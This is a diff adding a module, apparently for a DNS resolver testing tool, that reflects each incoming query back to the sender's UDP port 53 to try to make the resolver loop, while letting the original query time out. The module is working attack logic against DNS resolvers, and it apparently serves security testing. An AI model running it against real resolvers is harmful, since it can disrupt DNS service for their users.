@@ -1,0 +1,21 @@
+[module]
+name = "queryback3"
+info = "Query reflection, to port 53"
+desc = "Send back the same query to the sender to port udp/53. This might create a loop if the resolver uses the same IP address for listening for queries and for performing the resolution as well."
+type = "feature"
+author = "ivan.jedek@oryxlabs.com"
+
+code = '''
+if req.first_subdomain.startswith("queryback3"):
+   # Domain starts with "queryback3", let's send back the same query to the sender
+   # to udp/53 port, as an attempt to make a loop.
+   # Don't send any response to the original query (let it timeout)
+   buffer = resp.ID + req.RAW[2:]
+   log("sending back the same query to udp port 53")
+   # send back the query to port udp 53
+   s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
+   s.sendto(buffer, ((self.client_address[0], 53)))
+   # don't send anything back in this connection
+   timeout_conn(self)
+   #####################################################################
+'''
